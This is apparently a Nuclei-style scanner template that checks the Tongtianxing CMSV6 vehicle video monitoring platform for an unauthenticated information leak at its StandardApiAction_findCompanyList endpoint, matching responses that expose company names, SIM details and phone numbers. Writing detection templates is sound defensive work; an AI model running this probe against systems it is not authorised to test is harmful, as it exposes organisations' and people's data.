script_name: 通天星CMSV6车载视频监控平台StandardApiAction_findCompanyList信息泄露
content:
id: tongtianxing-cmsv6-standardapi-findcompanylist-info-leak

info:
  name: 通天星CMSV6车载视频监控平台StandardApiAction_findCompanyList信息泄露
  author: hyy
  severity: medium
  description: |
    通天星CMSV6车载视频监控平台StandardApiAction_findCompanyList存在信息泄露漏洞
  reference:
    - https://cwe.mitre.org/data/cwe.html
    - https://portswigger.net/web-security/information-disclosure
  tags: struts2,info-leak,api,unauth,iot,vehicle-monitor,exposure
  metadata:
    verified: true
    source: manual-research

    max-redirects: 2
    timeout: 10
    skip-verification: true

requests:
  - method: GET
    path:
      - "{{BaseURL}}/StandardApiAction_findCompanyList.action"

    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
      Accept-Encoding: gzip, deflate
      Accept-Language: zh-CN,zh;q=0.9
      Upgrade-Insecure-Requests: '1'
      Connection: close

    matchers:
      # 必须满足：状态码为200
      - type: status
        status:
          - 200
        condition: and

      # 匹配中文或英文敏感字段（任一命中即可）
      - type: word
        part: body
        encoding: utf8
        words:
          - "companys"
          - "name"
          - "id"
          - "level"
          - "companyName"
          - "simInfo"
          - "phone"
        condition: and

      # 排除登录跳转或权限拒绝页面（防止误报）
      - type: word
        part: body
        negative: true
        words:
          - "请先登录"
          - "登录超时"
          - "无权访问"
          - "Access Denied"
          - "Not Authorized"
          - "403 Forbidden"
          - "未登录"
          - "login"
          - "signin"

# 所有 matcher 必须同时满足
    matchers-condition: and
